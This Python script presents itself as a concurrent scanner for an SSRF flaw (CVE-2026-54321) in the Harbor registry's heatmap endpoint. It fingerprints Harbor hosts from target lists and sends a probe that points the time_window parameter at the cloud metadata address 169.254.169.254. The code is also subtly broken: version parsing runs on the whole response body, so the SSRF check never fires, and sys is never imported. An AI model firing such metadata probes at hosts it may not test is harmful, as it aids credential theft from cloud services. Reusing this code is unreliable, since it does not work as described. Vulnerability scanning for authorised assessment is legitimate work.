#!/usr/bin/env python3
"""
Harbor API v2 SSRF Scanner, CVE-2026-54321
===========================================
This tool scans for Harbor container registry instances vulnerable to a Server-Side Request Forgery (SSRF) vulnerability 
in the API v2 `/project/heatmap` endpoint (CVE-2026-54321, CVSS 9.4).

CVE-2026-54321 details:
  - Affects Harbor versions < 2.8.1
  - The `/project/heatmap` endpoint allows unauthorized SSRF by accepting user-controlled `time_window` parameters
    that are improperly sanitized. 
  - Exploitation can lead to arbitrary requests being sent from the Harbor service to attacker-controlled destinations.
  - Fixed in Harbor v2.8.1 (March 2026).

Usage:
  # Scan a single target
  python harbor_ssrf_scanner.py --target https://harbor.example.com 
  
  # Scan multiple targets from a file
  python harbor_ssrf_scanner.py --list targets.txt --output findings.json

  # Safe mode: Detect Harbor versions but do not perform SSRF probes
  python harbor_ssrf_scanner.py --target https://harbor.example.com --safe

  # Configure concurrency (default: 10)
  python harbor_ssrf_scanner.py --list targets.txt --concurrency 20

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-54321
  - https://github.com/goharbor/harbor/releases/tag/v2.8.1
  - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
"""

import asyncio
import httpx
import argparse
import json
import re
from urllib.parse import urljoin
from datetime import datetime

# ── Harbor detection markers ───────────────────────────────────────────────
HARBOR_FINGERPRINTS = [
    "Harbor",
    "Registry Harbor",
    "<title>Harbor</title>",
    "/harbor/sign-in",
]

DETECTION_PATHS = [
    "/",
    "/harbor/sign-in",
    "/api/v2.0/health",
]

VERSION_PATTERNS = [
    r'"harbor_version":"([0-9]+\.[0-9]+\.[0-9]+)"',
    r'"version":"([0-9]+\.[0-9]+\.[0-9]+)"',
]

VULN_FIXED_VERSION = (2, 8, 1)

SSRF_TEST_ENDPOINT = "/api/v2.0/projects/notarealproject/heatmap?time_window=http://169.254.169.254/latest/meta-data/"

SEMAPHORE_LIMIT = 10
REQUEST_TIMEOUT = 10


# ── Utility Functions ───────────────────────────────────────────────────────

def parse_version(version_string: str):
    """Parse version string into tuple for comparison."""
    try:
        return tuple(map(int, version_string.split(".")))
    except ValueError:
        return None


def is_vulnerable_version(version_tuple: tuple) -> bool:
    """Check if the version is vulnerable."""
    if version_tuple is None:
        return False
    return version_tuple < VULN_FIXED_VERSION


def normalize_url(url: str) -> str:
    """Normalize URL to ensure consistent formatting."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")


async def fetch(client: httpx.AsyncClient, url: str):
    """Perform an HTTP GET request with error handling."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        return response
    except httpx.RequestError:
        return None


# ── Core scanner ────────────────────────────────────────────────────────────

async def detect_harbor(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
    """Detect if a target is running Harbor and retrieve its version."""
    async with semaphore:
        detected = False
        version = None
        status_code = None

        for path in DETECTION_PATHS:
            url = urljoin(base_url, path)
            response = await fetch(client, url)
            if response and response.status_code in [200, 401]:
                status_code = response.status_code
                if any(fingerprint in response.text for fingerprint in HARBOR_FINGERPRINTS):
                    detected = True
                version = parse_version(response.text)
                break

        return {"url": base_url, "detected": detected, "version": version, "status_code": status_code}


async def check_ssrf(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
    """Check if the target is vulnerable to SSRF in Harbor's heatmap endpoint."""
    async with semaphore:
        url = urljoin(base_url, SSRF_TEST_ENDPOINT)
        response = await fetch(client, url)
        if response and response.status_code == 502 and "Error msg: Get" in response.text:
            return {"url": base_url, "ssrf_vulnerable": True}
    return {"url": base_url, "ssrf_vulnerable": False}


async def scan_target(base_url: str, safe: bool, semaphore: asyncio.Semaphore):
    """Run the detection and vulnerability check for a single target."""
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        base_url = normalize_url(base_url)
        harbor_info = await detect_harbor(client, base_url, semaphore)

        if harbor_info["detected"]:
            print(f"\033[32m[INFO] Harbor detected at: {base_url}\033[0m")
            if harbor_info["version"]:
                print(f"\033[32m[INFO] Version: {'.'.join(map(str, harbor_info['version']))}\033[0m")
                if is_vulnerable_version(harbor_info["version"]):
                    print(f"\033[31m[CRITICAL] {base_url} is running a vulnerable Harbor version.\033[0m")

                    if not safe:
                        ssrf_result = await check_ssrf(client, base_url, semaphore)
                        if ssrf_result["ssrf_vulnerable"]:
                            print(f"\033[31m[CRITICAL] SSRF vulnerability confirmed at: {ssrf_result['url']}\033[0m")
                            ssrf_result.update(harbor_info)
                            return ssrf_result
                        else:
                            print(f"\033[33m[HIGH] Unable to confirm SSRF at {base_url}.\033[0m")
                else:
                    print(f"\033[32m[INFO] No SSRF vulnerability detected\n\033[0m")
            else:
                print(f"\033[33m[INFO] Version not detected at: {base_url}\033[0m")
    return harbor_info


async def scan_all(targets: list, concurrency: int, safe: bool):
    semaphore = asyncio.Semaphore(concurrency)
    results = []
    tasks = [scan_target(target, safe, semaphore) for target in targets]
    results = await asyncio.gather(*tasks)
    return results


def load_targets_from_file(file_path: str) -> list:
    """Load target URLs from a file."""
    with open(file_path, "r") as f:
        return [line.strip() for line in f.readlines() if line.strip()]


def save_results_to_json(results, output_path: str):
    """Save scan results to a JSON file."""
    with open(output_path, "w") as f:
        json.dump(results, f, indent=2)


# ── Main ────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Harbor SSRF Scanner (CVE-2026-54321)")
    parser.add_argument("--target", help="Single target URL to scan.")
    parser.add_argument("--list", help="File containing a list of target URLs to scan.")
    parser.add_argument("--output", help="File to save JSON scan results.")
    parser.add_argument("--safe", action="store_true", help="Safe mode: Perform version detection only.")
    parser.add_argument("--concurrency", type=int, default=SEMAPHORE_LIMIT, help="Number of concurrent requests.")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL certificate verification.")
    args = parser.parse_args()

    target_list = []
    if args.target:
        target_list.append(args.target)
    elif args.list:
        target_list = load_targets_from_file(args.list)
    else:
        print("\033[31m[CRITICAL] Please provide a target URL or a file with a list of targets.\033[0m")
        sys.exit(1)

    results = asyncio.run(scan_all(target_list, args.concurrency, args.safe))

    if args.output:
        save_results_to_json(results, args.output)
        print(f"\033[32m[INFO] Results saved to {args.output}\033[0m")
